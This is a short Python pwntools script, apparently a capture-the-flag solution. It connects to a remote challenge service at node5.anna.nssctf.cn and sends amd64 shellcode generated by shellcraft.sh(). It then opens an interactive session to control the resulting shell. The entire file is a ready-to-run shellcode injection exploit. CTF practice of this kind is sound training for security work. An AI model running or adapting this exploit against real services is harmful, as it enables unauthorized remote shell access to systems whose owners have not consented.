from pwn import *

context(os = 'linux', arch = 'amd64')
#io = process("./service")
io = remote("node5.anna.nssctf.cn", 23386)

shellcode = asm(shellcraft.sh())
io.sendline(shellcode)

io.interactive()
